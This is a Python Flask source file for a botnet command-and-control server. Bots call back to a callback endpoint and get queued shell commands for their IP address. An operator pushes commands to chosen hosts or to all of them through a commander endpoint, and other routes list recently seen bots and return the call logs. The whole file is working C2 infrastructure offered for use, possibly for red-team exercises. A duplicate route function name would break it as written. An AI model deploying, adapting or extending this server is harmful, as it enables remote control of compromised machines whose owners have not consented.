"""
Process POST/GET requests from clients/commander, distribute commands and keep track of bot callbacks
@author: degenerat3
"""

from flask import Flask, request
from time import gmtime, strftime
import os
import datetime



app = Flask(__name__)

all_hosts = set()


@app.route('/api/callback/<host>/<typ>')
def process_callbacks(host, typ):
    
    ip = host.replace("-", ".")
    global all_hosts
    all_hosts.add(ip)
    src = typ
    call_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())

    if os.path.isfile("/tmp/cc/calls.log"):
        with open("/tmp/cc/calls.log", 'a') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    else:
        with open("/tmp/cc/calls.log", 'w') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    com_file = "/tmp/cc/hosts/" + ip
    if os.path.isfile(com_file):
        with open(com_file, 'r') as f:
            c = f.read()
            os.remove(com_file)
            return c + "\n"
    else:
        return "#lmao\n" 


def log_action(hosts, cmds):
    action_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
    log_str = action_time + " : " + str(hosts) + " : " + cmds
    with open("/tmp/cc/actions.log", 'a') as f:
        f.write(log_str)

@app.route('/api/commander/push', methods=['POST'])
def proc_inc_coms():
    content = request.json 
    host_str = content['hosts']
    coms = content['commands']
    if host_str.strip() == "all":    
        hosts = list(all_hosts)
    else:
        hosts = host_str.split('|')

    log_action(hosts, coms)
    for h in hosts:
        com_file = "/tmp/cc/hosts/" + h
        if os.path.isfile(com_file):
            with open(com_file, 'a') as f:
                f.write(coms)
        else:
            with open(com_file, 'w') as f:
                f.write(coms)
    return ""


def parse(filename):
    data = {}
    for line in reversed(list(open(filename))):
        date, time, ip, source = line.strip().split()
        log_time = datetime.datetime.strptime(date +" "+time, '%Y-%m-%d %H:%M:%S')
        diff = datetime.datetime.now() - log_time
        if diff.seconds > 600:
            break
        if ip not in data:
            data[ip] = set()
        data[ip].add(source)
    return data


@app.route('/api/commander/show')
def show_hosts():
    host_str = ""
    data = parse("/tmp/cc/calls.log")
    for ip in data:
        ln = "{}: {}".format(ip, data[ip]) + "\n"
        host_str += ln
    return host_str

@app.route('/api/commanders/calls')
def show_call_log():
    with open("/tmp/cc/calls.log", 'r') as f:
        s = f.read()
        return s

@app.route('/api/commander/tasks')
def show_call_log():
    with open("/tmp/cc/tasks.log", 'r') as f:
        s = f.read()
        return s


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')


